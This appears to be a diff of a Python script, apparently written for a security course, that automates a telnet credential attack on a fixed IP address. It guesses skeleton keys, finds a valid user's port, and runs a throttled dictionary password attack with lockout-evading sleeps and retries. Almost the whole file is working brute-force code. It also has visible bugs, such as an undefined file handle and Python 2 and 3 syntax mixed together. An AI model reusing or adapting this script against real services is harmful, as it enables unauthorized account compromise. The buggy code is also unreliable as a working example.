@@ -8,7 +8,7 @@ import io
 import sys
 import time
 
-ports = ['5028', '5071', '5103', '5123', '5264', '5292', '5338', '5357', '5461', '5541', '5743', '5769', '5784', '5878', '5882', '5897', '5966', '6033', '6034', '6051', '6192', '6291', '6308', '6367', '6428', '6448', '6489', '6585', '6610', '6616', '6652', '6762', '6842', '6942', '6978', '7011', '7029', '7041', '7068', '7138', '7328', '7510', '7694', '7765', '7819', '7829', '7919', '7984', '7992', '8009', '8147', '8152', '8212', '8229', '8248', '8314', '8392', '8441', '8487', '8500', '8511', '8648', '8659', '8665', '8751', '8757', '8763', '8831', '8849', '8914', '8933', '8961', '8966', '9011', '9105', '9111', '9152', '9274', '9392', '9526', '9589', '9631', '9714', '9779', '9890', '9936', '9999']
+ports = ['5071', '5103', '5123', '5264', '5292', '5338', '5357', '5461', '5541', '5743', '5769', '5784', '5878', '5882', '5897', '5966', '6033', '6034', '6051', '6192', '6291', '6308', '6367', '6428', '6448', '6489', '6585', '6610', '6616', '6652', '6762', '6842', '6942', '6978', '7011', '7029', '7041', '7068', '7138', '7328', '7510', '7694', '7765', '7819', '7829', '7919', '7984', '7992', '8009', '8147', '8152', '8212', '8229', '8248', '8314', '8392', '8441', '8487', '8500', '8511', '8648', '8659', '8665', '8751', '8757', '8763', '8831', '8849', '8914', '8933', '8961', '8966', '9011', '9105', '9111', '9152', '9274', '9392', '9526', '9589', '9631', '9714', '9779', '9890', '9936', '9999']
 
 def setup_dir():
     if not os.path.exists(".tmp/"):
@@ -66,37 +66,35 @@ def expect_not(child, line, f_out):
     try:
         index = child.expect([line,])
         if index == 0:
-            print("FAIL")
-            # f_out.write(u"FAIL\n")
+            f_out.write(u"FAIL\n")
             child.close()
     except pexpect.exceptions.EOF as e:
-        # f_out.write(u"FAIL WITH EOF\n")
-        print("FAIL WITH EOF")
         child.close()
         raise e
     except pexpect.exceptions.TIMEOUT:
-        index = child.expect([re.compile(r"[a-zA-Z0-9]+"), pexpect.exceptions.EOF, pexpect.exceptions.TIMEOUT], timeout=0.1)
+        index = child.expect([re.compile(r"[a-zA-Z0-9]*"), pexpect.exceptions.EOF, pexpect.exceptions.TIMEOUT], timeout=0.1)
         if index == 0:
-            # f_out.write(u"SUCCESS\n")
-            print("SUCCESS")
+            f_out.write(u"SUCCESS\n")
             child.close()
             return True
         elif index == 1:
-            # f_out.write(u"MATCH BUT FIL WITH EOF")
+            f_out.write(u"MATCH BUT FAIL WITH EOF\n")
             child.close()
         elif index == 2:
-            # f_out.write(u"MATCH BUT FIL WITH TIMEOUT")
+            f_out.write(u"MATCH BUT FAIL WITH TIMEOUT\n")
             child.close()
-        print("FAIL WITH TIMEOUT")
-        child.close()
     return False
 
 
 def mount_dictionary_attack(passwords_fname, skeleton_key, username, port):
+    f_out = io.open(".tmp/dictionary.out","w")
     while True:
-        for password in reverse_pop(passwords_fname, 3):
+        passwords = reverse_pop(passwords_fname, 3)
+        for password in passwords:
+            if password == '':
+                return None
+            f_out.write(u'Testing password on 128.114.59.215:' + str(port) + '\n    SKELETON KEY: ' + skeleton_key + '\n    USERNAME    : ' + username + '\n    PASSWORD    : ' + password + '\n    STATUS      : ')
             
-            print(u'Testing on 128.114.59.215:' + str(port) + '\n    SKELETON KEY: ' + skeleton_key + '\n    USERNAME    : ' + username + '\n    PASSWORD    : ' + password + '\n    STATUS      :',end='')
             child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)
 
 
@@ -106,43 +104,50 @@ def mount_dictionary_attack(passwords_fname, skeleton_key, username, port):
             try:
                 child.expect("Username: ", timeout=0.1)
             except pexpect.exceptions.EOF:
-                print("EOF ON EXPECTING USERNAME")
+                f_out.write(u"EOF EXPECTING USERNAME \n")
                 child.close()
+                f_out.flush()
+                continue
             except pexpect.exceptions.TIMEOUT:
-                print("TIMEOUT ON EXPECTING USERNAME")
+                f_out.write(u"TIMEOUT EXPECTING USERNAME \n")
+                child.close()
+                f_out.flush()
+                continue
 
             # if skeleton_key accepted, 
             #  send username to the Username:
-            try:
-                child.sendline(username)
-            except pexpect.exceptions.EOF:
-                print("EOF ON USERNAME")
-                child.close()
-            except pexpect.exceptions.TIMEOUT:
-                print("TIMEOUT ON USERNAME")
+            child.sendline(username)
+
 
             child.sendline(password)
 
             try:
-                if expect_not(child,"Incorrect password, goodbye.", sys.stdout):
-                    print("SUCCESS")
+                if expect_not(child,"Incorrect password, goodbye.", f_out):
                     return password
             except pexpect.exceptions.EOF:
-                print("    RETRY PASSWORD")
+                f_out.write("    RETRY PASSWORD \n")
+                passwords.append(password)
+                f_out.flush()
                 time.sleep(600)
 
-            sys.stdout.flush()
+            f_out.flush()
+        
+        if len(passwords) < 3:
+            return None
 
-        for j in range(0,10):
+
+        for j in range(1,11):
             time.sleep(60)
-            print(str(j*60) + " seconds")
+            f_out.write(unicode(str(j*60) + " seconds\n", "utf-8"))
+            f_out.flush()
 
 
 def find_designated_port(skeleton_key, username, ports, fast=True):
-    print("starting find")
-    f_out = io.open(".tmp/find_designated_port.out","w")
+    f_out = io.open(".tmp/port.out","w")
     for i in ports:
-        f_out.write(u"Testing username: " + username + " on port: " + str(i) + " STATUS:...")
+        f_out.write(u'Testing port on 128.114.59.215:' + str(i))
+        f_out.write(u"\n    SKELETON KEY : " + skeleton_key + "\n    USERNAME     : " + username + "\n    STATUS       : ")
+        
         child = pexpect.spawn("telnet 128.114.59.215 " + str(i), timeout=0.1)
 
 
@@ -152,9 +157,15 @@ def find_designated_port(skeleton_key, username, ports, fast=True):
         # close child and move on
         try:
             child.expect("Username: ", timeout=0.1)
-        except pexpect.exceptions.TIMEOUT:
-            f_out.write(u"FAIL\n")
+        except pexpect.exceptions.EOF:
+            f_out.write(u"EOF EXPECTING USERNAME \n")
             child.close()
+            f_out.flush()
+            continue
+        except pexpect.exceptions.TIMEOUT:
+            f_out.write(u"TIMEOUT EXPECTING USERNAME \n")
+            child.close()
+            f_out.flush()
             continue
 
 
@@ -162,30 +173,45 @@ def find_designated_port(skeleton_key, username, ports, fast=True):
         #  send username to the Username:
         child.sendline(username)
 
-        if expect_not(child, "Invalid user, goodbye.", f_out) and fast:
-            return i
-        else:
-            port = i
+        try:
+            val = expect_not(child, "Invalid user, goodbye.", f_out)
+            if val and fast:
+                f_out.flush()
+                return i
+            elif val:
+                port = i
+        except pexpect.exceptions.EOF:
+            f_out.write(u"EOF SENDING USERNAME \n")
+            child.close()
+            f_out.flush()
+            continue
+
+        f_out.flush()
 
         
     return port
 
 
 def find_skeleton(port, fast=True):
-    print("starting skeleton")
-    f_in = open("skeletonKeys.txt", "r")
-    f_out = io.open(".tmp/find_skeleton.out","w")
+    f_in = io.open("skeletonKeys.txt", "r")
+    f_out = io.open(".tmp/skeleton.out","w")
 
     for line in f_in.readlines():
-        f_out.write(u"Testing skeleton key: " + str(line).strip(' \t\r\n') + " STATUS:...")
+        f_out.write(u'Testing skeleton key on 128.114.59.215:' + str(port))
+        f_out.write(u"\n    SKELETON KEY : " + str(line).strip(' \t\r\n') + "\n    STATUS       : ")
+
         child = pexpect.spawn("telnet 128.114.59.215 " + str(port), timeout=0.1)
 
         child.sendline(str(str(line).strip(' \t\r\n')))
 
-        if expect_not(child,"Connection",f_out) and fast:
+        val = expect_not(child,"Connection closed by foreign host.",f_out)
+        if val and fast:
+            f_out.flush()
             return str(line).strip(' \t\r\n')
-        else:
+        elif val:
             key = str(line).strip(' \t\r\n')
+
+        f_out.flush()
 
     f.close()
     return key
@@ -194,12 +220,36 @@ def find_skeleton(port, fast=True):
 if __name__ == "__main__":
 
     setup_dir()
+    print("Attempting to find skeleton key....",end='')
+    key = find_skeleton(ports[0])
+    if key is not None:
+        print("found")
+        print("=================================================")
+        print(key)
+        print("=================================================")
+    else:
+        print("not found")
+        exit(1)
 
-    # key = find_skeleton(ports[0])
-    # my_port = find_designated_port(key, "dthurau", ports)
+    print("Attempting to designated port....",end='')
+    my_port = find_designated_port(key, "dthurau", ports)
+    if my_port is not None:
+        print("found")
+        print("=================================================")
+        print(my_port)
+        print("=================================================")
+    else:
+        print("not found")
+        exit(1)
 
-    password_dict = set(["what","the","fuck","how","does","this","work","fuck","a","duck","duck","duck","duck","duck","duck","duck"])
-    password = mount_dictionary_attack("passwords.txt",'passepartout',"dthurau",str(5357))
-    print("=================================================")
-    print(password)
-    print("=================================================")
+    print("Attempting to guess password....",end='')
+    password = mount_dictionary_attack("passwords.txt",key,"dthurau",my_port)
+
+    if password is not None:
+        print("found")
+        print("=================================================")
+        print(password)
+        print("=================================================")
+    else:
+        print("not found")
+        exit(1)
